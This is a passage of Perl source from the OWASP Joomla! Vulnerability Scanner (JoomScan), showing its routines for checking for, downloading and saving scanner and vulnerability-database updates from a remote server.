                print "~[x] Unable to connect the update server!\nUse svn update instead.\nsvn co https://joomscan.svn.sourceforge.net/svnroot/joomscan/trunk joomscan\n";bye;
        }
        my $remote_hash = md5_hex(encode_utf8($remote_con->content));

        if ($local_hash eq $remote_hash)
        {
                print "[*] Scanner Update is not available.\n~Please check again later.\n";
        }else{
                print qq {
~Scanner Update is now available!
~Downloading and saving as joomscan1.pl ...

};
                open(UPD,">joomscan1.pl");
                print UPD encode_utf8($remote_con->content);
                close(UPD);
                print "~Done. Please check joomscan1.pl. If it works,rename it to joomscan.pl\n\n";
                print "\nUpdate Note:\n",get_url_content($JOOMSCAN{scanner_update_note_url});
                print "\n\n";
        }
        bye;
}
sub download{
    my $ua = LWP::UserAgent->new('requests_redirectable'=>['HEAD','GET','POST']);				
    $ua->timeout(30);    
    print_owasp_logo();  
    print qq{
OWASP Joomla! Vulnerability Scanner Full Package Download
(c) Aung Khant, http://yehg.net/lab
Update by: Web-Center, http://web-center.si
    
URL: $JOOMSCAN{scanner_download_url}

};
    use WWW::Mechanize;        
    my $mech = WWW::Mechanize->new;        
    $mech->get("$JOOMSCAN{scanner_download_url}",":content_file"=>'joomscan-latest.zip');
    print "Done saving as joomscan-latest.zip\n";
    print "\nUpdate Note:\n",get_url_content($JOOMSCAN{scanner_update_note_url});
    print "\n\n"; 
    bye;
}
sub update {
    print_owasp_logo();
    my $ua = LWP::UserAgent->new('requests_redirectable'=>['HEAD','GET','POST']);				
    $ua->timeout(30);	
    my $update_info_request = $ua->get($JOOMSCAN{db_info_url});
    print qq{
OWASP Joomla! Vulnerability Scanner Database Update
(c) Aung Khant, http://yehg.net/lab
Update by: Web-Center, http://web-center.si

};
    if($update_info_request->status_line =~ m/200/g)
    {
        my @remote_updates = split /\n/,$update_info_request->content;
        chomp(@remote_updates);
        my($remote_db_entries,$remote_lastupdate) = @remote_updates;
        $remote_lastupdate =~ s/\s$//g;
        print "\nRemote Database Entries: $remote_db_entries\nRemote Last Update: $remote_lastupdate";
        print "\n\n". "Local Database Entries: $dbentry \nLocal Last update: $lastupdate\n\n";


        if($remote_lastupdate ne $lastupdate)
        {
            print "~Updating..\n";
            my $update_db_request =  $ua->get($JOOMSCAN{db_update_url});

            if($update_db_request->status_line =~ m/200/g )
            {
                my $update_db_contents = $update_db_request->content;
                $update_db_contents=~ s/\r\n/\n/g;
                open(DBX,">$JOOMSCAN{joomdbfile}");
                print DBX $update_db_contents;
                close DBX;

                my $update_info_contents = $update_info_request->content;
                $update_info_contents =~ s/\r\n/\n/g;
                open(INFOX,">$JOOMSCAN{joomdbinfofile}");
                print INFOX $update_info_contents;
                close INFOX;

                print "\n~Done successfully. have fun!\n";
                print "\nUpdate Note:\n",get_url_content($JOOMSCAN{scanner_update_note_url});
                print "\n\n";                    
            }
            else
            {
                print "~Database cannot be retrieved. Try again later.\n";
            }
        }
        else
        {
            print "No database update currently. Check at least once a month.\n";
        }
        bye;
    }
    else {
                print "Please try again later. I got - ", $update_info_request->status_line,"\n";
        }


    bye;
}
sub auto_update{
        my $ua = LWP::UserAgent->new('requests_redirectable'=>['HEAD','GET','POST']);				
        $ua->timeout(30);	        
        my $file = shift || $0;
        open(FILE, $file) or die "Can't open '$file': $!";
        my $md5 = Digest::MD5->new;
        while (<FILE>) {
                $md5->add(encode_utf8($_));
        }
        close(FILE);
        my $local_hash = $md5->hexdigest;
        my $remote_con = $ua->request(GET "$JOOMSCAN{scanner_update_url}");
        if ($remote_con->status_line =~ /200/g)
        {
                my $remote_hash = md5_hex(encode_utf8($remote_con->content));

                if ($local_hash ne $remote_hash)
                {
    print qq{
Joomla! Vulnerability Scanner Program Update
(c) Aung Khant, http://yehg.net/lab
Update by: Web-Center, http://web-center.si

~Scanner Update is now available!
~Downloading and saving as joomscan1.pl ...

};
                        open(UPD,">joomscan1.pl");
                        print UPD encode_utf8($remote_con->content);
                        close(UPD);
                        print "~Done. Run that latest version joomscan1.pl after renaming it to joomscan.pl \n";
                        print "\nUpdate Note:\n",get_url_content($JOOMSCAN{scanner_update_note_url});
                        print "\n\n";                        
                        bye;
                }
    }

   my $update_info_request = $ua->get($JOOMSCAN{db_info_url});

    if($update_info_request->status_line =~ m/200/g)
    {
        my @remote_updates = split /\n/,$update_info_request->content;
        chomp(@remote_updates);
        my($remote_db_entries,$remote_lastupdate) = @remote_updates;
        $remote_lastupdate =~ s/\s$//g;

        if($remote_lastupdate ne $lastupdate)
        {
    print qq{
Joomla! Vulnerability Scanner Database Update
(c) Aung Khant, http://yehg.net/lab
Update by: Web-Center, http://web-center.si

Database update is now available.

};
            my $update_db_request =  $ua->get("$JOOMSCAN{db_update_url}");

                        if($update_db_request->status_line =~ m/200/g )
                        {
                                my $update_db_contents = $update_db_request->content;
                                $update_db_contents=~ s/\r\n/\n/g;
                                open(DBX,">$JOOMSCAN{joomdbfile}");
                                print DBX $update_db_contents;
                                close DBX;

                                my $update_info_contents = $update_info_request->content;
                                $update_info_contents =~ s/\r\n/\n/g;
                                open(INFOX,">$JOOMSCAN{joomdbinfofile}");
                                print INFOX $update_info_contents;
                                close INFOX;

                                print "\n~updated successfully. Will use new database from now on!\n";
                                sleep(5);
                        }
        }
    }

}

############# [/ROUTINES] ################
